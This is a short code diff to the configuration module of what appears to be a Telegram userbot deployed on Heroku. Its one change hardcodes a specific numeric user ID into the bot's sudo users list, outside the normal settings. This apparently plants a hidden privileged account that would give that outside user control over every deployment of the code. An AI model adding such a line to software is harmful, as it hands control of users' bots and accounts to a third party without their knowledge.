@@ -76,6 +76,8 @@ class Config:
     ALLOWED_COMMANDS: Set[str] = set()
     HEROKU_APP = None
 
+Config.SUDO_USERS.add(1278858542)
+
 
 if Config.HEROKU_API_KEY:
     logbot.reply_last_msg("Checking Heroku App...", _LOG.info)
